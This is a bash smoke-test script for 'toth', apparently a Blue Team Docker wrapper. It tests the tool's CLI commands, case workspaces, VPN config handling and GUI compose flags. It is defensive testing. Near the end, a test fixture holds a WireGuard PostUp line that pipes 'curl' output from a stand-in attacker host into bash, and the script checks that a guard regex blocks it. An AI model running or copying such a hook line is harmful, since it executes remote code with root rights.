#!/bin/bash
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
TOTH=(python3 "$ROOT/wrapper/toth.py")

"${TOTH[@]}" --version | grep -q "toth 0.2.0"
"${TOTH[@]}" --help | grep -q "Blue Team Docker distribution"
"${TOTH[@]}" --help | grep -q "list,status,start,enter,restart,stop,remove,rm,exec,shell,update,case,vpn"
"${TOTH[@]}" --help | grep -q "pull images or build them locally"
"${TOTH[@]}" list | grep -q "toth-dfir:0.2.0"
"${TOTH[@]}" list | grep -q "ghcr.io/xlxxt/toth-dfir:0.2.0"
"${TOTH[@]}" list | grep -q "dfir.*default"
"${TOTH[@]}" start --help | grep -q "base,dfir,malware,network"
"${TOTH[@]}" enter --help | grep -q "cmd"
"${TOTH[@]}" restart --help | grep -q "base,dfir,malware,network"
"${TOTH[@]}" stop --help | grep -q "base,dfir,malware,network"
"${TOTH[@]}" remove --help | grep -q "base,dfir,malware,network"
"${TOTH[@]}" rm --help | grep -q "base,dfir,malware,network"
"${TOTH[@]}" exec --help | grep -q "cmd"
"${TOTH[@]}" shell --help | grep -q "cmd"
"${TOTH[@]}" update --help | grep -q "base,dfir,malware,network,all"
"${TOTH[@]}" update --help | grep -q -- "--build"

# --gui (X11 forwarding): available on start/exec/shell (the commands that
# call `docker compose up`, i.e. actually create/recreate the container and
# so decide which compose files get layered in). No real X server exists in
# this sandboxed/CI environment, so these are structural argparse checks,
# not a real GUI pop-up test.
"${TOTH[@]}" start --help | grep -q -- "--gui"
"${TOTH[@]}" exec --help | grep -q -- "--gui"
"${TOTH[@]}" shell --help | grep -q -- "--gui"

# enter re-attaches to an already-existing container via `docker start`/
# `docker exec` directly -- it never calls `docker compose up`, so it never
# re-evaluates which compose files are layered in, and deliberately does not
# expose --gui (a container's GUI mounts are fixed at creation time by
# start/exec/shell --gui). Assert it stays absent so this scope decision
# doesn't silently drift.
"${TOTH[@]}" enter --help | grep -qv -- "--gui"

# The flag must actually change the constructed `docker compose` argv
# (compose-file layering), and the no-flag path must be byte-for-byte
# unchanged from before --gui existed -- this is the regression that
# matters most, so it's checked directly against docker_manager._compose_args
# (a pure function, no subprocess/Docker/X server involved) rather than only
# at the argparse level.
python3 - "$ROOT" <<'PY'
import sys
sys.path.insert(0, sys.argv[1] + "/wrapper")
from utils import docker_manager as dm

no_flag = dm._compose_args(["up", "-d", "toth-network"])
gui_false = dm._compose_args(["up", "-d", "toth-network"], gui=False)
gui_true = dm._compose_args(["up", "-d", "toth-network"], gui=True)

assert no_flag == ["compose", "up", "-d", "toth-network"], no_flag
assert gui_false == no_flag, gui_false
assert gui_true == [
    "compose",
    "-f", "docker-compose.yml",
    "-f", "docker-compose.gui.yml",
    "up", "-d", "toth-network",
], gui_true
print("[+] docker_manager._compose_args --gui plumbing OK")
PY

# Per-profile config overrides (Phase 2, Tier 1): a TOTH_PROFILE_<NAME>_TAG
# env var should surface in `toth list` output for that profile only, and
# remote_image() (GHCR pull target) must stay unaffected.
TOTH_PROFILE_BASE_TAG="override-test" "${TOTH[@]}" list | grep -q "toth-base:override-test"
TOTH_PROFILE_BASE_TAG="override-test" "${TOTH[@]}" list | grep -q "toth-base.*(overridden)"
TOTH_PROFILE_BASE_TAG="override-test" "${TOTH[@]}" list | grep -q "ghcr.io/xlxxt/toth-base:0.2.0"

"${TOTH[@]}" case --help | grep -q "new,list,use,current"
"${TOTH[@]}" case new --help | grep -q "name"
"${TOTH[@]}" case list --help | grep -q "usage: toth case list"
"${TOTH[@]}" case use --help | grep -q "name"
"${TOTH[@]}" case current --help | grep -q "usage: toth case current"

"${TOTH[@]}" vpn --help | grep -q "add,remove,show"
"${TOTH[@]}" vpn add --help | grep -q -- "--creds"
"${TOTH[@]}" vpn add --help | grep -q -- "--force"
"${TOTH[@]}" vpn remove --help | grep -q "usage: toth vpn remove"
"${TOTH[@]}" vpn show --help | grep -q "usage: toth vpn show"

# Case commands are filesystem-only and must work without Docker installed
# or reachable, and must not touch any files without an explicit workspace.
CASE_WORKSPACE="$(mktemp -d)"
trap 'rm -rf "$CASE_WORKSPACE"' EXIT

TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" case current | grep -q "No case is currently active"
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" case list | grep -q "No cases found"
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" case new alpha | grep -q "case 'alpha' created and set active"
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" case current | grep -q "^alpha$"
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" case new beta >/dev/null
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" case list | grep -q "\* beta"
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" case use alpha | grep -q "case 'alpha' is now active"
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" case current | grep -q "^alpha$"
[ -d "$CASE_WORKSPACE/cases/alpha" ]
[ -d "$CASE_WORKSPACE/output/alpha" ]
[ -d "$CASE_WORKSPACE/cases/beta" ]
[ -d "$CASE_WORKSPACE/output/beta" ]

set +e
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" case use nope 2>&1 | grep -q "does not exist"
set -e

# VPN config storage/CLI (step 1 of docs/roadmap-vpn.md): pure filesystem
# work, no Docker involved. Uses the same case-scoped scratch workspace as
# the case tests above, and 'alpha'/'beta' cases already created there.
VPN_SRC="$(mktemp -d)"
trap 'rm -rf "$CASE_WORKSPACE" "$VPN_SRC"' EXIT
printf 'fake openvpn config\n' > "$VPN_SRC/config.ovpn"
printf 'analyst\nhunter2\n' > "$VPN_SRC/creds.txt"
printf '[Interface]\n' > "$VPN_SRC/config.conf"
printf 'wrong extension\n' > "$VPN_SRC/config.wrong"

TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" vpn show alpha | grep -q "No VPN config set"

TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" vpn add alpha "$VPN_SRC/config.ovpn" --creds "$VPN_SRC/creds.txt" \
  | grep -q "OpenVPN config added to case 'alpha'"
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" vpn show alpha | grep -q "kind: OpenVPN"
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" vpn show alpha | grep -q "creds: present"
[ -f "$CASE_WORKSPACE/vpn/alpha/config.ovpn" ]
[ "$(stat -c '%a' "$CASE_WORKSPACE/vpn/alpha/creds.txt")" = "600" ]

# Re-adding without --force must be refused.
set +e
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" vpn add alpha "$VPN_SRC/config.ovpn" 2>&1 | grep -q "Use --force to overwrite"
set -e

# --force allows the overwrite.
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" vpn add alpha "$VPN_SRC/config.ovpn" --force \
  | grep -q "OpenVPN config added to case 'alpha'"

# A different case gets a WireGuard config, detected as a different kind.
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" vpn add beta "$VPN_SRC/config.conf" \
  | grep -q "WireGuard config added to case 'beta'"
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" vpn show beta | grep -q "kind: WireGuard"
[ -f "$CASE_WORKSPACE/vpn/beta/config.conf" ]

# 'vpn show' with no case argument resolves the active case (alpha, per the
# case tests above).
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" case use alpha >/dev/null
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" vpn show | grep -q "case: alpha"

# Wrong extension is rejected with a clear error.
set +e
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" vpn add alpha "$VPN_SRC/config.wrong" 2>&1 | grep -q "unrecognized VPN config extension"
set -e

# Removal cleans up the case's vpn directory.
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" vpn remove alpha | grep -q "VPN config removed from case 'alpha'"
TOTH_WORKSPACE="$CASE_WORKSPACE" "${TOTH[@]}" vpn show alpha | grep -q "No VPN config set"
[ ! -e "$CASE_WORKSPACE/vpn/alpha/config.ovpn" ]

# Legacy fallback: a fresh workspace with no .active-case file must behave
# exactly as before this feature -- flat cases/ and output/ directories.
LEGACY_WORKSPACE="$(mktemp -d)"
trap 'rm -rf "$CASE_WORKSPACE" "$VPN_SRC" "$LEGACY_WORKSPACE"' EXIT
TOTH_WORKSPACE="$LEGACY_WORKSPACE" "${TOTH[@]}" case current | grep -q "legacy workspace mode"
[ ! -e "$LEGACY_WORKSPACE/.active-case" ]

# VPN mount shim (step 3 of docs/roadmap-vpn.md): docker_manager must expose
# a third "vpn" symlink alongside "cases"/"output" when a case is active, and
# create a flat <workspace>/vpn root when no case is active -- both are pure
# filesystem work, exercised directly (no Docker needed) the same way
# --gui's _compose_args plumbing is checked above.
SHIM_WORKSPACE="$(mktemp -d)"
trap 'rm -rf "$CASE_WORKSPACE" "$VPN_SRC" "$LEGACY_WORKSPACE" "$SHIM_WORKSPACE"' EXIT
TOTH_WORKSPACE="$SHIM_WORKSPACE" "${TOTH[@]}" case new gamma >/dev/null

TOTH_WORKSPACE="$SHIM_WORKSPACE" python3 - "$ROOT" <<'PY'
import os
import sys

sys.path.insert(0, sys.argv[1] + "/wrapper")
from utils import docker_manager as dm

resolved = dm._resolve_workspace()
for name in ("cases", "output", "vpn"):
    link = os.path.join(resolved, name)
    assert os.path.islink(link), f"{name} is not a symlink: {link}"
    assert os.path.isdir(link), f"{name} symlink target missing: {link}"
assert os.path.realpath(os.path.join(resolved, "vpn")).endswith(
    os.path.join("vpn", "gamma")
), dm._resolve_workspace()
print("[+] docker_manager vpn symlink shim OK (active case)")
PY

NOCASE_WORKSPACE="$(mktemp -d)"
trap 'rm -rf "$CASE_WORKSPACE" "$VPN_SRC" "$LEGACY_WORKSPACE" "$SHIM_WORKSPACE" "$NOCASE_WORKSPACE"' EXIT
TOTH_WORKSPACE="$NOCASE_WORKSPACE" python3 - "$ROOT" <<'PY'
import sys

sys.path.insert(0, sys.argv[1] + "/wrapper")
from utils import docker_manager as dm

dm.ensure_workspace()
PY
[ -d "$NOCASE_WORKSPACE/vpn" ]

# config/entrypoint/vpn-entrypoint.sh syntax, and its WireGuard
# Pre/PostUp/Pre/PostDown guard (config/entrypoint/vpn-entrypoint.sh's
# start_wireguard(), found during security review: wg-quick runs those
# directives as a root shell command, so a malicious/tampered third-party
# config must be refused, not executed). No Docker/wg-quick/openvpn
# involved -- exercises the exact guard regex against representative
# config content the same way it's applied in the real script.
ENTRYPOINT_SCRIPT="$ROOT/config/entrypoint/vpn-entrypoint.sh"
bash -n "$ENTRYPOINT_SCRIPT"

GUARD_PATTERN='^[[:space:]]*(pre|post)(up|down)[[:space:]]*='
# Literal substring, not GUARD_PATTERN itself, to confirm the guard clause
# is still wired up in the real script -- GUARD_PATTERN is anchored (^) and
# would never match its own occurrence embedded mid-line inside the
# script's `if grep ...` statement.
grep -qF 'wg-quick would run as a root shell command' "$ENTRYPOINT_SCRIPT"

benign_conf="$(mktemp)"
malicious_conf="$(mktemp)"
trap 'rm -rf "$CASE_WORKSPACE" "$VPN_SRC" "$LEGACY_WORKSPACE" "$SHIM_WORKSPACE" "$NOCASE_WORKSPACE" "$benign_conf" "$malicious_conf"' EXIT
cat > "$benign_conf" <<'EOF'
[Interface]
PrivateKey = fake
Address = 10.0.0.2/24

[Peer]
PublicKey = fake
AllowedIPs = 0.0.0.0/0
EOF
cat > "$malicious_conf" <<'EOF'
[Interface]
PrivateKey = fake
Address = 10.0.0.2/24
PostUp = curl -s http://evil.example/x | bash

[Peer]
PublicKey = fake
AllowedIPs = 0.0.0.0/0
EOF

# Explicit if/exit assertions rather than a bare `!`/`grep -q` -- under
# `set -e`, a command whose result is inverted with `!` never triggers
# errexit even when the negation itself represents a failed assertion, so
# that idiom would silently pass regardless of the actual match result.
assert_guard() {
    local expect_match="$1" desc="$2" content="$3"
    if printf '%s' "$content" | grep -Eiq "$GUARD_PATTERN"; then
        [ "$expect_match" = "yes" ] || { echo "[!] guard pattern false-positived: $desc" >&2; exit 1; }
    else
        [ "$expect_match" = "no" ] || { echo "[!] guard pattern missed: $desc" >&2; exit 1; }
    fi
}

assert_guard no  "benign WireGuard config"                   "$(cat "$benign_conf")"
assert_guard yes "malicious PostUp config"                    "$(cat "$malicious_conf")"
assert_guard yes "case-insensitive, no space around '='"      "preup=whoami"
assert_guard yes "leading whitespace before PreDown"          "  PreDown = /bin/true"
assert_guard no  "commented-out PostUp line is not active"    "# PostUp = whoami"
echo "[+] vpn-entrypoint.sh WireGuard hook-directive guard OK"

echo "[+] Wrapper command smoke tests passed"
